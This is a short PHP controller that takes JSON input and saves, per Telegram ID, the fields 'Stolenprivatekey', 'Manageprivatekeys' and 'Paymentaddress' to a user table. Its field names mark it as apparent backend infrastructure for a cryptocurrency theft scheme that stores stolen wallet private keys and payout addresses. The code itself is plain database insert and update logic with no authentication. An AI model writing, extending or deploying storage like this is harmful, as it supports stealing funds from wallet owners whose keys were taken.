<?php
// 所有自定义控制器的基本控制器,应该继承自它
namespace app\hc\v1\controller;


use Db\Db;
use function common\dump;
use function common\retur;


use common\Controller;

class  UpdateController extends Controller
{
    public function user()
    {
        try {
            $data = json_decode(file_get_contents('php://input'), true);
            $arr =  Db::table('user')->field('*')->where(['tgid' => $data['tgid']])->find();
            if ($arr) {
                $arr =  Db::table('user')->where(['tgid' => $data['tgid']])->update(['Stolenprivatekey' => $data['Stolenprivatekey'], 'Manageprivatekeys' => $data['Manageprivatekeys'], 'Paymentaddress' => $data['Paymentaddress']]);
                if ($arr > 0) {
                    echo json_encode(retur('成功', $arr));
                } else {
                    echo json_encode(retur('失败', '没更改任何数据', 409));
                }
                //修改
            } else {
                //添加
                $arr =  Db::table('user')->insert(['tgid' => $data['tgid'], 'Stolenprivatekey' => $data['Stolenprivatekey'], 'Manageprivatekeys' => $data['Manageprivatekeys'], 'Paymentaddress' => $data['Paymentaddress']]);
                if ($arr > 0) {
                    echo json_encode(retur('成功', $arr));
                } else {
                    echo json_encode(retur('失败', '添加失败请查看参数', 422));
                }
            }
        } catch (\Throwable $th) {
            echo json_encode(retur('失败', '非法访问', 500));
        }
    }
}
